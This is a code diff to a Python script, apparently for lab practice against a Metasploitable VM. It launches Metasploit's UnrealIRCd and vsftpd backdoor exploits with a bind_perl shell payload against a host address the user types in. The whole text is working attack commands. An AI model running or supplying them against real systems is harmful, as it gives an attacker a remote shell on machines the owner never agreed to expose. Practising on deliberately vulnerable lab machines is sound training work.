@@ -70,7 +70,14 @@ def unreal_backdoor():
     host = input('Please enter the address of metasploitable: ')
     print('Connecting to IRTX metasploitable at', host)
     # Construct command line argumaents
-    command = "/bin/bash -e msfconsole -x 'use exploit/unix/ird/unreal_ircd_3281_backdoor;set RHOSTS" + host + ";set payload cmd/unix/bind_perl;exploit"
+    command = "msfconsole -x 'use exploit/unix/irc/unreal_ircd_3281_backdoor;set RHOSTS " + host + ";set payload cmd/unix/bind_perl;exploit'"
+    s.system(command)
+
+def vsftpd_backdoor():
+    host = input('Please enter the address of metasploitable: ')
+    print('Connecting to IRTX metasploitable at', host)
+    # Construct command line argumaents
+    command = "msfconsole -x 'use exploit/unix/ftp/vsftpd_234_backdoor;set RHOSTS " + host + ";set payload cmd/unix/bind_perl;exploit'"
     s.system(command)
 
 
